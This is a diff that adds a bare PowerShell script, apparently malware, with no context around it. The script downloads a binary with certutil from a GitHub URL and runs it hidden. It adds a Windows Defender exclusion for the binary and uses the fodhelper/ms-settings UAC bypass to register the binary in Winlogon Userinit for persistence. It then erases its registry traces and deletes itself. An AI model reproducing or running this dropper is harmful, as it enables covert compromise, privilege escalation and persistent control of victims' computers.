@@ -1,0 +1,24 @@
+——————————
+
+$randomSuffix = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+$targetExe = "$env:TEMP\$randomSuffix.exe"
+
+certutil -urlfetch -verify -f "https://github.com/0x699/mrc/raw/refs/heads/main/sihost.bin" "$targetExe" >$null 2>&1
+
+Start-Process -FilePath $targetExe -WindowStyle Hidden -PassThru | Out-Null
+
+Add-MpPreference -ExclusionProcess $targetExe -ErrorAction SilentlyContinue
+
+$regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
+
+Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
+New-Item -Path $regPath -Force | Out-Null
+
+Set-ItemProperty -Path $regPath -Name "(Default)" -Value "cmd /c reg add `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" /v `"Userinit`" /t REG_SZ /d `"C:\windows\system32\userinit.exe,$targetExe,`" /f >nul 2>&1 & powershell -w hidden -ep bypass -c `"Remove-Item -Path '$PSCommandPath' -Force`"" -Type String
+New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
+
+Start-Process "C\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+Start-Job -ScriptBlock { Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue } | Out-Null
+
+Remove-Item -Path $PSCommandPath -Force -ErrorAction SilentlyContinue
